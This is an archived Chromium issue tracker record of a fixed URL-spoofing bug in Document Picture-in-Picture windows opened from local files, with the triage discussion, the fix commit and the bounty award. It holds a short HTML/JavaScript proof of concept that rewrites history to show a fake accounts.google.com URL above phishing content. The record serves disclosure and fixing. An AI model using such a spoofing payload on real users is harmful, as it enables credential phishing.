# URL Spoofing in Document PiP; related to issue 1450376; regression?

| Field | Value |
|-------|-------|
| **Issue ID** | [40072134](https://issues.chromium.org/issues/40072134) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P3 |
| **Component** | Blink>Media>PictureInPicture |
| **Platforms** | Linux, Mac, Windows |
| **Reporter** | js...@gmail.com |
| **Assignee** | st...@chromium.org |
| **Created** | 2023-09-13 |
| **Bounty** | $500.00 |

## Description

**Steps to reproduce the problem:**

1. Open the attached html.
2. Click on the "Open PIP" button
3. Observe the spoofed URL.

**Problem Description:**  

Issue report:  

<https://bugs.chromium.org/p/chromium/issues/detail?id=1450376>

Patch:  

<https://chromium.googlesource.com/chromium/src/+/072893c8a5739f777ac98a173e2a31753704b50e>

```
pip2: Always elide the URL in the titlebar  
  
This CL ensures that the URL in a document picture-in-picture window is  
always elided, even when the user has selected "Always Show Full URLs"  
in the omnibox.  
  
(cherry picked from commit dc77f9839826a27e2f0bb5210f50920a890412e7)  
  
Bug: 1450376  
Change-Id: I6275e0ff9d3a9a860e5e4086732d717c47bdc3fc  
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4581312  
Commit-Queue: Tommy Steimel <steimel@chromium.org>  
Reviewed-by: Scott Violet <sky@chromium.org>  
Cr-Original-Commit-Position: refs/heads/main@{#1152637}  
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4590806  
Auto-Submit: Tommy Steimel <steimel@chromium.org>  
Commit-Queue: Scott Violet <sky@chromium.org>  
Cr-Commit-Position: refs/branch-heads/5790@{#407}  
Cr-Branched-From: 1d71a337b1f6e707a13ae074dca1e2c34905eb9f-refs/heads/main@{#1148114}  

```

**Additional Comments:**

```
<style>  
    #content {  
        display: none;  
    }  
</style>  
  
<button id="button">Open PIP</button>  
  
<div id="content">  
    phishing page content here  
</div>  
  
<script>  
    const pipOpen = async () => {  
        history.replaceState(null, '', '?...............................https://accounts.google.com/login/device/verify');  
  
        const pipWindow = await documentPictureInPicture.requestWindow({  
            width: 330,  
            height: 317  
        });  
          
        setTimeout(() => {  
            history.replaceState(null, '', '/');  
        }, 1000);  
  
        pipWindow.document.body.append(content);  
    };  
  
    button.onclick = pipOpen;  
</script>  

```

\*\*Chrome version: \*\* 116.0.5845.187 \*\*Channel: \*\* Stable

**OS:** Mac OS

## Attachments

- [1450376.html](attachments/1450376.html) (text/plain, 659 B)
- [test-2023-09-15_17.47.15.mp4](attachments/test-2023-09-15_17.47.15.mp4) (video/mp4, 146.3 KB)
- [1482045.mov](attachments/1482045.mov) (video/quicktime, 435.8 KB)

## Timeline

### [Deleted User] (2023-09-13)

[Empty comment from Monorail migration]

### ar...@google.com (2023-09-15)

[secondary security shepherd]

Here is an URL to try the reproducer: https://cubic-jagged-perch.glitch.me/

I can't reproduce on Linux, See the video. I see the origin displayed.
Needs-feedback: Am I doing something wrong to reproduce the issue? Is this specific to Mac maybe?

In the meantime, we can make the issue visible to steimel@ and sky@ who previously fixed it. Could you please try to reproduce it?

[Monorail components: Blink>Media>PictureInPicture]

### js...@gmail.com (2023-09-15)

Sorry I haven't checked this in a remote condition.

Maybe this can only be reproduced in local by opening a html.

I will check if I can make the issue appear there.

Here's a recording when the attached html is opened in local.

### st...@chromium.org (2023-09-15)

I'm unable to reproduce on Mac (checked both stable and canary)

### st...@chromium.org (2023-09-15)

oh okay yes by downloading the file I'm able to reproduce

### js...@gmail.com (2023-09-15)

I just checked, it's only reproducible when it's opened as a html file in local.

I guess PictureInPictureBrowserFrameView::ShouldPreventElision() did not work for local file url

### js...@gmail.com (2023-09-15)

Sorry for the confusion! Thanks.

### st...@chromium.org (2023-09-15)

+liberato@ who worked on similar about:blank issues

### st...@chromium.org (2023-09-15)

Yes, kFormatUrlTrimAfterHost (for path and query) is ignored for file:// urls: https://source.chromium.org/chromium/chromium/src/+/main:components/url_formatter/url_formatter.cc;l=681;drc=31fb07c05718d671d96c227855bfe97af9e3fb20

### st...@chromium.org (2023-09-15)

So, we could manually remove path/query for our URL in the file:// case, but then I get a feeling there'd be a crbug for spoofing from a file saved to a spoof-like filepath. Is the best path forward to just not show anything except the File chip?

arthursonzogni@, do you have any opinions on best end state here? Or someone/team that I can ask about this?

### st...@chromium.org (2023-09-15)

[Empty comment from Monorail migration]

### js...@gmail.com (2023-09-15)

Maybe display the beginning of the URL rather than truncating from the start?

google.com/long
show -> google.com/lo...
not -> ...om/long

### nh...@google.com (2023-09-15)

Verified (on macOS) this reproduces on extended stable (M116) and canary (M119), and tentatively setting OS=Linux, Mac, Windows as I assume this applies to all desktop OSes. As mentioned in https://crbug.com/chromium/1482045#c6, this only works when the page is loaded via a file:// URL.

### [Deleted User] (2023-09-15)

[Empty comment from Monorail migration]

### ct...@chromium.org (2023-09-15)

Re: https://crbug.com/chromium/1482045#c12, if I'm remembering correctly I think that matches how url_formatter::ElideURL() works for file:// URLs, so that seems like a reasonable approach. Filepath seems the least spoofable aspect of a file manually opened from disk, while filename and query string are more attacker controlled. Filename is at least potentially known to user, while the query string is completely dynamic... but really the bit of information we want to convey to the user here is "this is a file on disk not a remote web page", so starting with the filepath seems reasonable.

### js...@gmail.com (2023-09-16)

Thanks for your feedback!

### st...@chromium.org (2023-09-18)

Okay seems like the best path forward then is to switch the eliding when the URL is a file URL. I'll do that

### gi...@appspot.gserviceaccount.com (2023-09-18)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/fb54c10d8b5a9e7c68f76ea8501c7e8664429bbb

commit fb54c10d8b5a9e7c68f76ea8501c7e8664429bbb
Author: Tommy Steimel <steimel@chromium.org>
Date: Mon Sep 18 23:52:25 2023

pip2: Elide tail for file URLs

This CL changes document picture-in-picture windows to elide the tail
of the origin display for file URLs, since the file name can be made to
look like an origin for spoofing.

We will continue to elide the head of the origin display for HTTPS
URLs, since origins should be head-elided to prevent spoofing.

Bug: 1482045
Change-Id: Ib0ce7abf869e42b5b070aba9246c9e784a3d2140
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4874656
Commit-Queue: Tommy Steimel <steimel@chromium.org>
Reviewed-by: Scott Violet <sky@chromium.org>
Cr-Commit-Position: refs/heads/main@{#1198094}

[modify] https://crrev.com/fb54c10d8b5a9e7c68f76ea8501c7e8664429bbb/chrome/browser/ui/views/frame/picture_in_picture_browser_frame_view.cc


### st...@chromium.org (2023-09-19)

[Empty comment from Monorail migration]

### [Deleted User] (2023-09-19)

[Empty comment from Monorail migration]

### [Deleted User] (2023-09-19)

[Empty comment from Monorail migration]

### st...@chromium.org (2023-09-27)

[Empty comment from Monorail migration]

### am...@google.com (2023-10-05)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2023-10-05)

Congratulations! The Chrome VRP Panel has decided to award you $500 for this report. The reward amount was determined due to the minimal security consequences to a user presented by this issue. Since we made a security relevant change, we did want to reward you for your efforts. A member of our finance team will be in touch with you soon to arrange payment. In the meantime, please let us know the name or other identifier you would like us to use in acknowledging you for this finding. Thank you for your efforts and reporting this issue to us! 

### js...@gmail.com (2023-10-06)

Thank you for acknowledging my report and deciding on the reward. I appreciate the consideration given by the Chrome VRP Panel.

For the acknowledgment, please use the name "Junsung Lee".

### am...@google.com (2023-10-11)

[Empty comment from Monorail migration]

### pg...@google.com (2023-10-30)

[Empty comment from Monorail migration]

### pg...@google.com (2023-11-01)

[Empty comment from Monorail migration]

### pg...@google.com (2023-11-01)

[Empty comment from Monorail migration]

### [Deleted User] (2023-12-26)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2023-12-26)

This issue was migrated from crbug.com/chromium/1482045?no_tracker_redirect=1

[Monorail mergedwith: crbug.com/chromium/1487085]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40072134)*
